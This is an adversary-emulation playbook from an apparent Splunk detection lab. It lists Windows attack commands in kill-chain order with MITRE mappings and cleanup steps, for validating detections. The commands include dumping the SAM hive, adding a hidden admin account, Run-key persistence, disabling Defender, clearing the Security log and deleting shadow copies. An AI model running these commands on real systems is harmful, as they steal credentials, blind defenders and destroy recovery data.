# Attack Simulation Playbook

Every detection in this lab was validated by executing the corresponding attack on the monitored endpoint and confirming it surfaced in Splunk. This document collects those attacks in kill-chain order as a reproducible adversary-emulation script.

> **Note:** all commands were run in an isolated lab VM for detection testing. They are documented here for reproducibility and defensive validation only.

---

## Kill-chain sequence

The attacks below are ordered roughly as a real intrusion unfolds — from initial access through discovery, credential theft, persistence, defense evasion, and finally destructive impact.

| Stage | Technique | MITRE | Detection |
|-------|-----------|-------|-----------|
| Initial Access | Brute force | T1110 | 01 |
| Discovery | Reconnaissance burst | T1087 / T1082 | 08 |
| Credential Access | SAM hive dump | T1003.002 | 06 |
| Persistence | New admin account | T1136 | 02 |
| Persistence | Run key | T1547.001 | 07 |
| Defense Evasion | Defender tampering | T1562.001 | 05 |
| Defense Evasion | Log clearing | T1070.001 | 03 |
| Impact | Shadow copy deletion | T1490 | 04 |

---

## Simulation commands

### 1. Brute force — failed logins (T1110)
Repeatedly enter an incorrect password at the Windows lock screen, then log in successfully. Each failed attempt generates Event ID 4625.

### 2. Discovery — reconnaissance burst (T1087 / T1082)
```powershell
whoami /priv; net user; net localgroup administrators; systeminfo; ipconfig /all; tasklist
```

### 3. Credential dumping — SAM hive (T1003.002)
```powershell
reg save hklm\sam C:\Windows\Temp\sam.save
```

### 4. New account + privilege escalation (T1136)
```powershell
net user hacker P@ssw0rd123 /add
net localgroup administrators hacker /add
```

### 5. Run key persistence (T1547.001)
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\evil.exe" /f
```

### 6. Defender tampering (T1562.001)
```powershell
powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

### 7. Log clearing (T1070.001)
```powershell
wevtutil cl Security
```

### 8. Shadow copy deletion — ransomware precursor (T1490)
```powershell
vssadmin delete shadows /all /quiet
```

---

## Cleanup

After simulation, the lab environment is reset by removing the artifacts created above:

```powershell
net user hacker /delete
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f
powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
```

The Windows VM can also be restored from a clean snapshot to return to a known-good baseline.

---

## Why this matters

Documenting the attacks alongside the detections demonstrates **purple-team methodology**: the detections were not written in the abstract, they were validated against real adversary behavior. Each attack maps to a specific detection, and running the full sequence exercises the entire detection library end to end — including the risk-based alerting engine, which accumulates risk across the whole chain and surfaces the compromised host.
